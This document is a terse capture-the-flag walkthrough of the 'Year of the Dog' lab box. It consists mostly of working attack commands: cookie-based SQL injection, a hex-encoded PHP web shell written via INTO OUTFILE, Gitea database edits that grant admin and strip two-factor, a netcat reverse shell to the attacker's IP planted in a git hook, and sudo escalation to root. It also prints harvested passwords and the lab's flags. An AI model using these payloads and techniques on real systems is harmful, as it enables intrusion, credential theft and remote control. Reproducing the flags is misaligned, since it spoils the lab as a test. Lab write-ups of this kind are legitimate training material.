# Year_of_the_DOg 

> VOiD | Monday 08 November 2021 09:16:16 AM IST

My IP : 10.8.253.221
Target IP : 10.10.51.125


## PORT 80 [http]

```bash
Cookie: id=bbae51acec61575c23f3370736a4b603' UNION select 1,database() --+

webapp


Cookie: id=bbae51acec61575c23f3370736a4b603' UNION select 1,group_concat(table_name) from information_schema.tables where table_schema="webapp" --+

queue

UNION select 1,group_concat(column_name) from information_schema.columns where table_schema="webapp" and table_name="queue" --+

userID,queueNum

sqlmap -r req --batch --level=2

all values are use less 

Uploading webshell on system
Cookie: id=bbae51acec61575c23f3370736a4b603' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- +


http://10.10.51.125/shell.php?cmd=ls
```


## USER [www-data]
```bash
	$servername = "localhost";
	$username = "web";
	$password = "Cda3RsDJga";
	$dbname = "webapp";
```


```bash
www-data@year-of-the-dog:/home/dylan$ cat work_analysis
Sep  5 20:52:35 staging-server sshd[39191]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.142  user=root

www-data@year-of-the-dog:/home/dylan$ cat work_analysis | grep dylan
Sep  5 20:52:57 staging-server sshd[39218]: Invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624
Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2
Sep  5 20:53:04 staging-server sshd[39218]: Connection closed by invalid user dylanLabr4d0rs4L1f3 192.168.1.142 port 45624 [preauth]

```

## USER [Dylan]
```bash
Dylan : Labr4d0rs4L1f3

dylan@year-of-the-dog:~$ cat user.txt 
THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}


ssh dylan@10.10.84.104 -L 80:localhost:3000      


sqlite3 gitea.db
sqlite> select name,is_admin from user;
sqlite> update user set is_admin=1 where name="void";

+-------+----------+
| name  | is_admin |
+-------+----------+
| Dylan | 1        |
+-------+----------+

>>> import sqlite3
>>> con=sqlite3.connect('gitea.db')
>>> con.execute('delete from two_factor')
<sqlite3.Cursor object at 0x7f13ec7e3570>
>>> con.commit()
>>> con.close()


mkfifo /tmp/f; nc 10.8.253.221 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

copy it to githook

now to run it
Next, we will need to download the file as follow by running 
git clone http://localhost:3000/Dylan/Test-repo.git
```


## USER [git]
```bash
whoami
git
sudo -l
User git may run the following commands on 42040a8f97fc:
    (ALL) NOPASSWD: ALL


bash-4.4# cat root.txt 
THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}

```